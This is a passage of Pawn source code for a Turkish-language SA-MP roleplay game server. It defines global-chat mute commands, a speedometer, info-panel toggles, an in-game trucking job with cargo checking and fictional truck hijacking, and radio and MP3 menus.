	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gcoreset [Oyuncu ID/Ýsim] [sebep]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pGCMuted] == 2)
			{
				PlayerInfo[giveplayerid][pGCMuted] = 0;
				PlayerInfo[giveplayerid][pGCMutedTime] = 0;
				format(string, sizeof(string), "AdminKomutu: %s, %s adlý kiþinin Global Kanal bloklamasýný kaldýrdý, sebep: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
				ABroadCast(COLOR_LIGHTRED,string,1);

				SendClientMessage(giveplayerid, COLOR_GRAD2, "Global Kanal bloklaman kaldýrýldý. Global Kanal sistemini tekrar kullanabilirsin.");
				SendClientMessage(giveplayerid, COLOR_GRAD2, "Yapýlan hata ve yanlýþlýklardan dolayý özür dileriz.");

				format(string, sizeof(string), "AdminKomutu: %s, %s tarafýndan Global Kanal bloklamasý kaldýrýldý, sebep: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid),reason);
				Log("logs/mute.log", string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Oyuncu Global Kanalý kullanabilir durumda.");
			}

		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:gcmute(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gcmute [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pGCMuted] == 0)
			{
				PlayerInfo[giveplayerid][pGCMuted] = 1;
				format(string, sizeof(string), "AdminKomutu: %s, %s kiþisini Global Kanaldan süresiz blokladý.",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ABroadCast(COLOR_LIGHTRED,string,1);

				foreach(Player, i)
				{
					if(GlobalChat[i] == 1 && PlayerInfo[i][pAdmin] < 2)
					{
						SendClientMessage(playerid, COLOR_LIGHTRED, string);
					}
				}

				format(string, sizeof(string), "Global Kanalý kötüye kullanmaktan %s tarafýndan süresiz mutelendiniz. Temyiz için baþvurun (admin þikayetleri)", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_GRAD2, string);

				format(string, sizeof(string), "AdminKomutu: %s /gc den bloklandý, Bloklayan: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				Log("logs/mute.log", string);
			}
			else
			{
				PlayerInfo[giveplayerid][pGCMuted] = 0;
				PlayerInfo[giveplayerid][pGCMutedTime] = 0;
				format(string, sizeof(string), "AdminKomutu: %s kiþisinin Global Kanal kullanýmý, %s tarafýndan tekrar açýldý.",GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				ABroadCast(COLOR_LIGHTRED,string,1);

				foreach(Player, i)
				{
					if(GlobalChat[i] == 1 && PlayerInfo[i][pAdmin] < 2)
					{
						SendClientMessage(playerid, COLOR_LIGHTRED, string);
					}
				}

				format(string, sizeof(string), "%s tarafýndan Global Kanal kullanýmýn açýldý.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_GRAD2, string);

				format(string, sizeof(string), "AdminKomutu: %s kiþisinin /gc bloklamasý kaldýrýldý, Kaldýran: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				Log("logs/mute.log", string);
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:hizgostergesi(playerid, params[]) {
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) {
		SendClientMessage(playerid, COLOR_GREY, "Araç sürmüyorsun.");
	}
	else if(!PlayerInfo[playerid][pSpeedo]) {
		SendClientMessage(playerid, COLOR_WHITE, "Hýz göstergesini çalýþtýrdýn.");
		PlayerInfo[playerid][pSpeedo] = 1;

		if(!FindTimePoints[playerid]) {

			new
				szSpeed[42];

			format(szSpeed, sizeof(szSpeed),"~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~%.0f MPH", player_get_speed(playerid));
			GameTextForPlayer(playerid, szSpeed, 1500, 3);
		}
	}
	else {
		SendClientMessage(playerid, COLOR_WHITE, "Hýz göstergesini kapattýn.");
		PlayerInfo[playerid][pSpeedo] = 0;
		if(!FindTimePoints[playerid]) GameTextForPlayer(playerid, " ", 1500, 3);
	}
	return 1;
}

CMD:bilgilendirmekapat(playerid, params[]) 
{
	SendClientMessage(playerid, COLOR_WHITE, "Bilgilendime Kýsmýný Kapadýn");
	TextDrawHideForPlayer(playerid, mete0);
	TextDrawHideForPlayer(playerid, mete1);
	TextDrawHideForPlayer(playerid, mete2);
	TextDrawHideForPlayer(playerid, mete3);
	TextDrawHideForPlayer(playerid, mete4);
	TextDrawHideForPlayer(playerid, mete5);
	TextDrawHideForPlayer(playerid, mete6);
	TextDrawHideForPlayer(playerid, mete7);
	TextDrawHideForPlayer(playerid, mete8);
	TextDrawHideForPlayer(playerid, mete9);
	TextDrawHideForPlayer(playerid, mete10);
	TextDrawHideForPlayer(playerid, mete11);
	TextDrawHideForPlayer(playerid, mete12);
	TextDrawHideForPlayer(playerid, mete13);
	TextDrawHideForPlayer(playerid, bilgilen);
}	
CMD:bilgilendirmeac(playerid, params[]) 
{
	SendClientMessage(playerid, COLOR_WHITE, "Bilgilendime Kýsmýný Açtýn");
	TextDrawShowForPlayer(playerid, mete0);
	TextDrawShowForPlayer(playerid, mete1);
	TextDrawShowForPlayer(playerid, mete2);
	TextDrawShowForPlayer(playerid, mete3);
	TextDrawShowForPlayer(playerid, mete4);
	TextDrawShowForPlayer(playerid, mete5);
	TextDrawShowForPlayer(playerid, mete6);
	TextDrawShowForPlayer(playerid, mete7);
	TextDrawShowForPlayer(playerid, mete8);
	TextDrawShowForPlayer(playerid, mete9);
	TextDrawShowForPlayer(playerid, mete10);
	TextDrawShowForPlayer(playerid, mete11);
	TextDrawShowForPlayer(playerid, mete12);
	TextDrawShowForPlayer(playerid, mete13);
	TextDrawShowForPlayer(playerid, bilgilen);
}

CMD:yukkontrol(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 20 && PlayerInfo[playerid][pJob2] != 20 && !IsACop(playerid))
	{
        SendClientMessage(playerid, COLOR_GRAD2, "Kamyon þoförü veya polis deðilsin!");
        return 1;
	}

	new carid = GetPlayerVehicleID(playerid);
 	new closestcar = GetClosestCar(playerid, carid);
  	if(IsPlayerInRangeOfVehicle(playerid, closestcar, 6.0) && IsATruckerCar(closestcar))
	{
		new string[128];

		new truckcontents = TruckContents[closestcar];
		new truckcontentname[50];
		if(truckcontents == 0)
		{ format(truckcontentname, sizeof(truckcontentname), "Yok"); }
		else if(truckcontents >= 1 && truckcontents <= 3)
		{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Yiyecek & Içecek");}
		else if(truckcontents >= 4 && truckcontents <= 6)
		{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Kýyafet"); }
		else if(truckcontents == 7)
		{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Yasal materyaller"); }
		else if(truckcontents >= 8 && truckcontents <= 10)
		{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}24/7 eþyalarý"); }
		else if(truckcontents >= 11 && truckcontents <= 15)
		{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}Illegal silahlar"); }
		else if(truckcontents >= 16 && truckcontents <= 20)
		{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}Illegal uyuþturucular"); }
		else if(truckcontents >= 21 && truckcontents <= 25)
		{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}Illegal materyaller"); }

     	SendClientMessage(playerid, COLOR_GREEN,"________________ OCEAN DOCKS KAMYONLARI ________________");
		if(IsPlayerInVehicle(playerid, closestcar))
  		{
    		SendClientMessage(playerid, COLOR_WHITE, "O kamyonda bir oyuncu var. Kamyonun içeriðini kontrol etmek için þoförün inmesi gerekir.");
      		return 1;
		}

		format(string, sizeof(string), "Araç Kayýt: %s (%d)", GetVehicleName(closestcar), closestcar);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "Içerik: %s", truckcontentname);
		SendClientMessage(playerid, COLOR_WHITE, string);

		if(IsACop(playerid) && truckcontents >= 11)
		{
			SendClientMessage(playerid, COLOR_YELLOW, "Yasal olmayan ürünleri silmek için arabanýn yanýnda /yuktemizle yazýn.");
		}

		if(PlayerInfo[playerid][pJob] == 20 || PlayerInfo[playerid][pJob2] == 20)
		{
			if(truckcontents > 0 && TruckUsed[playerid] == INVALID_VEHICLE_ID)
			{
				SendClientMessage(playerid, COLOR_YELLOW, "Ürünleri teslim etmek için þoför olarak /yukcal yaz.");
			}
			else if(TruckUsed[playerid] == INVALID_VEHICLE_ID)
			{
				SendClientMessage(playerid, COLOR_YELLOW, "Ürünleri almak için þoför olarak /yukyukle yaz.");
			}
			else if(TruckUsed[playerid] == closestcar && gPlayerCheckpointStatus[playerid] == CHECKPOINT_RETURNTRUCK)
			{
				SendClientMessage(playerid, COLOR_YELLOW, "Bu senin kamyonun, ödeme almak için ürünleri hala teslim etmedin.");
			}
			else if(TruckUsed[playerid] == closestcar)
			{
				SendClientMessage(playerid, COLOR_YELLOW, "Bu senin kamyonun, ödeme almak için ürünleri hala teslim etmedin.");
			}
			else if(TruckUsed[playerid] != INVALID_VEHICLE_ID)
			{
				SendClientMessage(playerid, COLOR_YELLOW, "Baþka bir teslimattasýn, /iptal truck yazarak teslimatý iptal et.");
			}
		}
     	SendClientMessage(playerid, COLOR_GREEN,"_________________________________________________________");
    }
	else
	{
 		SendClientMessage(playerid, COLOR_GRAD1, "Ocean Docks Kamyonuna yakýn deðilsin.");
 	}
    return 1;
}

CMD:yuktemizle(playerid, params[])
{
	if(!IsACop(playerid))
	{
        SendClientMessage(playerid, COLOR_GRAD2, "Polis deðilsin!");
        return 1;
	}

	new carid = GetPlayerVehicleID(playerid);
 	new closestcar = GetClosestCar(playerid, carid);
  	if(IsPlayerInRangeOfVehicle(playerid, closestcar, 6.0) && IsATruckerCar(closestcar))
	{
		new truckcontents = TruckContents[closestcar];
		if(truckcontents < 11)
		{
			SendClientMessage(playerid, COLOR_WHITE, "Bu kamyonda illegal eþya yok.");
			return 1;
		}
		new string[128];

		new truckcontentname[50];
		if(truckcontents >= 11 && truckcontents <= 15)
		{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}illegal silahlar"); }
		else if(truckcontents >= 16 && truckcontents <= 20)
		{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}illegal uyuþturucular"); }
		else if(truckcontents >= 21 && truckcontents <= 25)
		{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}illegal materyal"); }
 		foreach(Player, i)
		{
  			if(TruckUsed[i] == closestcar)
     		{
    			DestroyProgressBar(LoadTruckBar[i]);
				LoadTruckBar[i] = INVALID_BAR_ID;
				LoadTruckTime[i] = 0;
				DeletePVar(i, "TruckDeliver");
				TruckUsed[i] = INVALID_VEHICLE_ID;
				TruckContents[closestcar] = 0;
				DisablePlayerCheckpoint(i);
				gPlayerCheckpointStatus[i] = CHECKPOINT_NONE;
 				SendClientMessage(i, COLOR_WHITE, "Kamyon teslimatýn iptal edildi. Devlet memuru illegal ürünlere el koydu.");
       		}
		}
		format(string, sizeof(string), "Kamyondan %s {FFFFFF} adlý içeriði sildin.", truckcontentname);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "* %s kamyondaki illegal eþyalarý aldý.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
    }
   	else
	{
 		SendClientMessage(playerid, COLOR_GRAD1, "Ocean Docks Kamyonlarýna yakýn deðilsin.");
 	}
    return 1;
}

CMD:yukcal(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 20 || PlayerInfo[playerid][pJob2] == 20)
	{
	    new vehicleid = GetPlayerVehicleID(playerid);
	    if(IsATruckerCar(vehicleid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    {
     		if(CheckPointCheck(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");

			if(GetProgressBarValue(LoadTruckBar[playerid]) > 10)
       		{
         		SendClientMessage(playerid, COLOR_WHITE, "Þu an kamyonunu yüklüyorsun!");
				return 1;
     		}
       		if(TruckUsed[playerid] != INVALID_VEHICLE_ID)
         	{
          		SendClientMessage(playerid, COLOR_WHITE, "Zaten baþka bir teslimattasýn, /iptal truck yazarak teslimatý iptal et.");
				return 1;
     		}
			if(TruckContents[vehicleid] == 0)
			{
   				SendClientMessage(playerid, COLOR_WHITE, "Bu kamyon boþ, hiçbir ürün içermiyor!");
				return 1;
			}
			if(IsPlayerInRangeOfPoint(playerid, 65, 2225.343261, -2635.977294, 13.438463))
			{
				SendClientMessage(playerid, COLOR_WHITE, "Ocean Docks'a bu kadar yakýnken kaçýramazsýn!");
				return 1;
			}

			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonu kaçýrmaya çalýþýyorsun, lütfen bekle....");

			TogglePlayerControllable(playerid, 0);
			SetPVarInt(playerid, "IsFrozen", 1);

			LoadTruckBar[playerid] = CreateProgressBar(258.00, 137.00, 131.50, 3.19, COLOR_GREEN, 100.0);
			SetProgressBarValue(LoadTruckBar[playerid], 100.0);
			ShowProgressBarForPlayer(playerid, LoadTruckBar[playerid]);
			SetTimerEx("HijackTruck", 1000, 0, "dd", playerid);
	    }
	    else return SendClientMessage(playerid, COLOR_GREY, "Ocean Docks Kamyonu sürmüyorsun!");
	}
	else return SendClientMessage(playerid, COLOR_GREY, "Kamyoncu deðilsin!");
	return 1;
}


forward HijackTruck(playerid);
public HijackTruck(playerid)
{
    new vehicleid = GetPlayerVehicleID(playerid);
	LoadTruckTime[playerid]--;
	SetProgressBarValue(LoadTruckBar[playerid], GetProgressBarValue(LoadTruckBar[playerid])-10.0);
	UpdateProgressBar(LoadTruckBar[playerid], playerid);
	if(GetProgressBarValue(LoadTruckBar[playerid]) > 10) SetTimerEx("HijackTruck", 1000, 0, "d", playerid);

	if(GetProgressBarValue(LoadTruckBar[playerid]) == 50.0)
	{
 		SetProgressBarColor(LoadTruckBar[playerid], COLOR_YELLOW);
   		UpdateProgressBar(LoadTruckBar[playerid], playerid);
	}
	else if(GetProgressBarValue(LoadTruckBar[playerid]) == 20.0)
	{
 		SetProgressBarColor(LoadTruckBar[playerid], COLOR_RED);
		UpdateProgressBar(LoadTruckBar[playerid], playerid);
	}
	else if(GetProgressBarValue(LoadTruckBar[playerid]) <= 10.0)
	{
		DeletePVar(playerid, "IsFrozen");
		TogglePlayerControllable(playerid, 1);
  		DestroyProgressBar(LoadTruckBar[playerid]);
    	LoadTruckBar[playerid] = INVALID_BAR_ID;

        if(!IsPlayerInVehicle(playerid, vehicleid))
        {
       		DestroyProgressBar(LoadTruckBar[playerid]);
			LoadTruckBar[playerid] = INVALID_BAR_ID;
			LoadTruckTime[playerid] = 0;
			DeletePVar(playerid, "TruckDeliver");
			TruckUsed[playerid] = INVALID_VEHICLE_ID;
			gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
 			DisablePlayerCheckpoint(playerid);
            SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kaçýrma giriþimin baþarýsýz oldu.");
			return 1;
        }


		foreach(Player, i)
		{
  			if(TruckUsed[i] == vehicleid)
  			{
				DestroyProgressBar(LoadTruckBar[i]);
				LoadTruckBar[i] = INVALID_BAR_ID;
				LoadTruckTime[i] = 0;
				DeletePVar(i, "TruckDeliver");
				TruckUsed[i] = INVALID_VEHICLE_ID;
				DisablePlayerCheckpoint(i);
				gPlayerCheckpointStatus[i] = CHECKPOINT_NONE;
 				SendClientMessage(i, COLOR_WHITE, "Teslimatýn baþarýsýz oldu, kamyonun kaçýrýldý.");
			}
		}

  		new truckdeliver = TruckContents[vehicleid];
  		SetPVarInt(playerid, "TruckDeliver", truckdeliver);
  		TruckUsed[playerid] = vehicleid;

		if(truckdeliver == 1)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Yiyecek & Ýçecek ile dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, 812.287231, -1623.678222, 13.546875, 5);
		}
		else if(truckdeliver == 2)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Yiyecek & Ýçecek ile dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, 1204.510375, -920.674499, 43.074016, 5);
		}
		else if(truckdeliver == 3)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Yiyecek & Ýçecek ile dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, 2402.169677, -1502.789306, 23.834865, 5);
		}
		else if(truckdeliver == 4)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kýyafet ile dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, 2110.254394, -1214.892578, 23.485479, 5);
		}
		else if(truckdeliver == 5)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kýyafet ile dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, 1458.425292, -1140.346069, 23.938444, 5);
		}
		else if(truckdeliver == 6)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kýyafet ile dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, 500.889678, -1352.339843, 15.463395, 5);
		}
		else if(truckdeliver == 7)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Materyal ile dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, 334.012207, -1373.775146, 14.230167, 5);
		}
		else if(truckdeliver == 8)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* 24/7 eþyalarý ile dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, 1317.785522, -870.413818, 39.089378, 5);
		}
		else if(truckdeliver == 9)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* 24/7 eþyalarý ile dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, 1342.577026, -1748.498535, 12.934987, 5);
		}
		else if(truckdeliver == 10)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* 24/7 eþyalarý ile dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, 653.629699, -579.503051, 15.889705, 5);
		}
		else if(truckdeliver >= 11 && truckdeliver <= 15)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Silah ile dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, 1634.834716, 757.830017, 10.820312, 5);

			new level = PlayerInfo[playerid][pTruckSkill];
			if(level >= 0 && level < 50)
			{ SetPVarInt(playerid, "TruckDeliver", 11); }
			else if(level >= 50 && level < 100)
			{ SetPVarInt(playerid, "TruckDeliver", 12); }
			else if(level >= 100 && level < 200)
			{ SetPVarInt(playerid, "TruckDeliver", 13); }
			else if(level >= 200 && level < 400)
			{ SetPVarInt(playerid, "TruckDeliver", 14); }
			else if(level >= 400)
			{ SetPVarInt(playerid, "TruckDeliver", 15); }
		}
		else if(truckdeliver >= 16 && truckdeliver <= 20)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, 2833.109375, 893.754699, 10.757797, 5);

			new level = PlayerInfo[playerid][pTruckSkill];
			if(level >= 0 && level < 50)
			{ SetPVarInt(playerid, "TruckDeliver", 16); }
			else if(level >= 50 && level < 100)
			{ SetPVarInt(playerid, "TruckDeliver", 17); }
			else if(level >= 100 && level < 200)
			{ SetPVarInt(playerid, "TruckDeliver", 18); }
			else if(level >= 200 && level < 400)
			{ SetPVarInt(playerid, "TruckDeliver", 19); }
			else if(level >= 400)
			{ SetPVarInt(playerid, "TruckDeliver", 20); }
		}
		else if(truckdeliver >= 21 && truckdeliver <= 25)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Illegal materyalle dolu bir kamyon kaçýrdýn.");
			SetPlayerCheckpoint(playerid, -510.522918, -501.250030, 25.523437, 5);

			new level = PlayerInfo[playerid][pTruckSkill];
			if(level >= 0 && level < 50)
			{ SetPVarInt(playerid, "TruckDeliver", 21); }
			else if(level >= 50 && level < 100)
			{ SetPVarInt(playerid, "TruckDeliver", 22); }
			else if(level >= 100 && level < 200)
			{ SetPVarInt(playerid, "TruckDeliver", 23); }
			else if(level >= 200 && level < 400)
			{ SetPVarInt(playerid, "TruckDeliver", 24); }
			else if(level >= 400)
			{ SetPVarInt(playerid, "TruckDeliver", 25); }
		}

		SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Ürünleri belirlenen noktaya teslim et (checkpoint'i radarda gör).");
		SendClientMessage(playerid, COLOR_REALRED, "UYARI: Kamyon korsanlarýna dikkat et, kamyonunu alýp ürünlerle beraber kaçabilirler.");
		if(truckdeliver >= 9)
		{
			SendClientMessage(playerid, COLOR_REALRED, "UYARI #2: Illegal ürün taþýyorsun, bu yüzden devlet memurlarýna dikkat et.");
		}
	}
	return 1;
}

CMD:yukyukle(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 20 || PlayerInfo[playerid][pJob2] == 20)
	{
	    new vehicleid = GetPlayerVehicleID(playerid);
	    if(IsATruckerCar(vehicleid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    {
	        if(CheckPointCheck(playerid))return SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");

		 	if(GetProgressBarValue(LoadTruckBar[playerid]) > 10)
    		{
      			SendClientMessage(playerid, COLOR_WHITE, "Þu an kamyonunu yüklüyorsun!");
				return 1;
    		}
      		if(TruckUsed[playerid] != INVALID_VEHICLE_ID)
        	{
         		SendClientMessage(playerid, COLOR_WHITE, "Zaten baþka bir teslimattasýn, /iptal truck yazarak teslimatý iptal et.");
				return 1;
     		}
       		gPlayerCheckpointStatus[playerid] = CHECKPOINT_LOADTRUCK;
         	SetPlayerCheckpoint(playerid,2197.660644, -2662.190185, 13.546875, 5);
          	GameTextForPlayer(playerid, "~w~Gecis Noktasi Ayarlandi ~r~Ocean Docks", 5000, 1);
           	SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ocean Docks'a teslimat için biraz ürün al (checkpoint'i radarda gör).");
	    }
	    else return SendClientMessage(playerid, COLOR_GREY, "Ocean Docks Kamyonunda deðilsin!");
	}
	else return SendClientMessage(playerid, COLOR_GREY, "Kamyoncu deðilsin!");
	return 1;
}

forward LoadTruck(playerid);
public LoadTruck(playerid)
{
	LoadTruckTime[playerid]--;
	SetProgressBarValue(LoadTruckBar[playerid], GetProgressBarValue(LoadTruckBar[playerid])-10.0);
	UpdateProgressBar(LoadTruckBar[playerid], playerid);
	if(GetProgressBarValue(LoadTruckBar[playerid]) > 10) SetTimerEx("LoadTruck", 1000, 0, "d", playerid);

	if(GetProgressBarValue(LoadTruckBar[playerid]) == 50.0)
	{
 		SetProgressBarColor(LoadTruckBar[playerid], COLOR_YELLOW);
   		UpdateProgressBar(LoadTruckBar[playerid], playerid);
	}
	else if(GetProgressBarValue(LoadTruckBar[playerid]) == 20.0)
	{
 		SetProgressBarColor(LoadTruckBar[playerid], COLOR_RED);
		UpdateProgressBar(LoadTruckBar[playerid], playerid);
	}
	else if(GetProgressBarValue(LoadTruckBar[playerid]) <= 10.0)
	{
		DeletePVar(playerid, "IsFrozen");
		TogglePlayerControllable(playerid, 1);
  		DestroyProgressBar(LoadTruckBar[playerid]);
    	LoadTruckBar[playerid] = INVALID_BAR_ID;

  		new vehicleid = GetPlayerVehicleID(playerid);
  		new truckdeliver = GetPVarInt(playerid, "TruckDeliver");
  		TruckContents[vehicleid] = truckdeliver;
  		TruckUsed[playerid] = vehicleid;

		if(truckdeliver == 1)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun Yiyecek & Ýçecek dolu.");
			SetPlayerCheckpoint(playerid, 812.287231, -1623.678222, 13.546875, 5);
		}
		else if(truckdeliver == 2)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun Yiyecek & Ýçecek dolu.");
			SetPlayerCheckpoint(playerid, 1204.510375, -920.674499, 43.074016, 5);
		}
		else if(truckdeliver == 3)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun Yiyecek & Ýçecek dolu.");
			SetPlayerCheckpoint(playerid, 2402.169677, -1502.789306, 23.834865, 5);
		}
		else if(truckdeliver == 4)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun Kýyafet dolu.");
			SetPlayerCheckpoint(playerid, 2110.254394, -1214.892578, 23.485479, 5);
		}
		else if(truckdeliver == 5)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun Kýyafet dolu.");
			SetPlayerCheckpoint(playerid, 1458.425292, -1140.346069, 23.938444, 5);
		}
		else if(truckdeliver == 6)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun Kýyafet dolu.");
			SetPlayerCheckpoint(playerid, 500.889678, -1352.339843, 15.463395, 5);
		}
		else if(truckdeliver == 7)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun Materyal dolu.");
			SetPlayerCheckpoint(playerid, 334.012207, -1373.775146, 14.230167, 5);
		}
		else if(truckdeliver == 8)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun 24/7 eþyalarý ile dolu.");
			SetPlayerCheckpoint(playerid, 1317.785522, -870.413818, 39.089378, 5);
		}
		else if(truckdeliver == 9)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun 24/7 eþyalarý ile dolu.");
			SetPlayerCheckpoint(playerid, 1342.577026, -1748.498535, 12.934987, 5);
		}
		else if(truckdeliver == 10)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun 24/7 eþyalarý ile dolu.");
			SetPlayerCheckpoint(playerid, 653.629699, -579.503051, 15.889705, 5);
		}
		else if(truckdeliver >= 11 && truckdeliver <= 15)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun silah ile dolu.");
			SetPlayerCheckpoint(playerid, 1634.834716, 757.830017, 10.820312, 5);
		}
		else if(truckdeliver >= 16 && truckdeliver <= 20)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun uyuþturucu ile dolu.");
			SetPlayerCheckpoint(playerid, 2833.109375, 893.754699, 10.757797, 5);
		}
		else if(truckdeliver >= 21 && truckdeliver <= 25)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Kamyonun illegal materyal ile dolu.");
			SetPlayerCheckpoint(playerid, -510.522918, -501.250030, 25.523437, 5);
		}

		SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Ürünleri belirlenen noktaya teslim et (checkpoint'i radarda gör)..");
		SendClientMessage(playerid, COLOR_REALRED, "UYARI: Kamyon korsanlarýna dikkat et, kamyonunu alýp ürünlerle beraber kaçabilirler.");
		if(truckdeliver >= 11)
		{
			SendClientMessage(playerid, COLOR_REALRED, "UYARI #2: Illegal ürün taþýyorsun, bu yüzden devlet memurlarýna dikkat et.");
		}
		SetPVarInt(playerid, "tpTruckRunTimer", 30);
		SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPTRUCKRUNTIMER);
	}
	return 1;
}

CMD:mp3(playerid, params[])
{
    if(PlayerInfo[playerid][pDonator] < 2 && AdminDuty[playerid] == 0)
        return SendClientMessage(playerid, COLOR_WHITE, "Bu özelliði kullanabilmek için en az Safir+ VIP olman gerekir.");

   	if(PlayerCuffed[playerid] >= 1 || GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");

	ShowPlayerDialogEx(playerid, DIALOG_MP3_START, DIALOG_STYLE_LIST, "Radyo", "MP3 Player'i kapat\nIsim ile ara\nTür ile ara", "Seç", "Iptal");
    return 1;
}

CMD:radyoistasyonu(playerid, params[]) {
	return cmd_radyoac(playerid, params);
}

CMD:radyoac(playerid, params[]) {
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
        ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_START, DIALOG_STYLE_LIST, "Radyo", "Radyoyu kapat\nIsim ile ara\nTür ile ara", "Seç", "Iptal");
    else SendClientMessage(playerid, COLOR_GRAD1, "Bir araç kullanmýyorsun.");

    return 1;
}

CMD:telefonkapat(playerid, params[])
{
	if(PlayerInfo[playerid][pJailed] > 0)
	{
